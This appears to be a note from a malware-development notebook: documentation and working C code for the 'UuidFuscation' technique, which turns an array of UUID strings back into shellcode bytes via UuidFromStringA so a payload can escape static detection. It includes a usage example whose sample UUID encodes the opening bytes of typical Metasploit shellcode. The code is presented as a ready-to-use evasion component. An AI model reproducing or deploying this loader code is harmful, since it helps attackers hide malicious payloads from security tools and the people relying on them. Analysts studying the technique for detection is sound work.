## Shellcode UUIDFuscation Deobfuscation

Converts an array of UUID strings back into the original shellcode byte buffer using the WinAPI `UuidFromStringA` exported from `Rpcrt4.dll`. The function handles little-endian and big-endian segment reordering automatically. Each UUID string is resolved into 16 bytes and written sequentially into a heap-allocated output buffer. The number of elements in the array multiplied by 16 gives the recovered shellcode size.

**Usage**

Call `UuidDeobfuscation` with the UUID string array, its element count, and two `OUT` pointers that receive the deobfuscated shellcode buffer and its size. The output buffer is heap-allocated by the function; the caller is responsible for freeing it with `HeapFree`.

- `IN CHAR* UuidArray[]`  Array of UUID strings produced by `GenerateUuidOutput`.
- `IN SIZE_T NmbrOfElements`  Number of UUID strings in `UuidArray`.
- `OUT PBYTE* ppDAddress`  Receives the base address of the heap-allocated deobfuscated shellcode buffer.
- `OUT SIZE_T* pDSize`  Receives the size of the deobfuscated shellcode buffer in bytes (`NmbrOfElements * 16`).

**Return Value**

`BOOL`  Returns `TRUE` if deobfuscation succeeds and `ppDAddress` / `pDSize` are populated, otherwise `FALSE`.

**External Files**

- `windows.h`  `PBYTE`, `BOOL`, `SIZE_T`, `IN`, `OUT`, `LoadLibrary()`, `GetProcAddress()`, `HeapAlloc()`, `GetProcessHeap()`, `GetLastError()`
- `rpcdce.h`  `RPC_STATUS`, `RPC_CSTR`, `UUID`, `RPC_S_OK` — included transitively via `windows.h` on most setups; link against `Rpcrt4.lib` if needed.
- `stdio.h`  `printf()`

### Code

```c
#include <windows.h>
#include <stdio.h>

typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR    StringUuid, // The UUID string to convert.
    UUID*       Uuid        // Output: receives the 16-byte binary UUID.
);


BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize)
{
    PBYTE      pBuffer    = NULL,
               TmpBuffer  = NULL;
    SIZE_T     sBuffSize  = NULL;
    RPC_STATUS STATUS     = NULL;

    // Resolve UuidFromStringA from Rpcrt4.dll at runtime.
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(
        LoadLibrary(TEXT("RPCRT4")),    // Rpcrt4.dll exports UUID utility functions.
        "UuidFromStringA"               // Converts a UUID string to a 16-byte binary UUID.
    );
    if (pUuidFromStringA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Each UUID string deobfuscates to exactly 16 bytes.
    sBuffSize = NmbrOfElements * 16;

    pBuffer = (PBYTE)HeapAlloc(
        GetProcessHeap(),       // Use the process default heap.
        HEAP_ZERO_MEMORY,       // Zero the allocation upfront.
        sBuffSize               // Total size of the recovered shellcode.
    );
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // TmpBuffer walks forward through pBuffer by 16 bytes per iteration.
    TmpBuffer = pBuffer;

    for (int i = 0; i < NmbrOfElements; i++) {

        // Deobfuscate one UUID string into 16 bytes written at TmpBuffer.
        // UuidFromStringA handles little-endian reordering of segments 1-3 automatically.
        if ((STATUS = pUuidFromStringA(
            (RPC_CSTR)UuidArray[i],     // Single UUID string from the obfuscated array.
            (UUID*)TmpBuffer            // Output: 16 deobfuscated bytes written here.
        )) != RPC_S_OK) {
            printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
            return FALSE;
        }

        // Advance the write cursor by 16 bytes to avoid overwriting recovered bytes.
        TmpBuffer = (PBYTE)(TmpBuffer + 16);
    }

    *ppDAddress = pBuffer;
    *pDSize     = sBuffSize;

    return TRUE;
}
```

**Example**

```c
// Array produced by the Obfuscation note — 1 UUID = 16 recovered bytes.
CHAR*  UuidArray[]      = { "E48348FC-E5F0-50E2-4151-525356575553" };
SIZE_T NmbrOfElements  = sizeof(UuidArray) / sizeof(UuidArray[0]);

PBYTE  pDAddress = NULL;
SIZE_T pDSize     = 0;

// Recover the original shellcode into a heap-allocated buffer.
if (UuidDeobfuscation(UuidArray, NmbrOfElements, &pDAddress, &pDSize)) {
    HeapFree(GetProcessHeap(), 0, pDAddress);  // Caller frees.
}
```
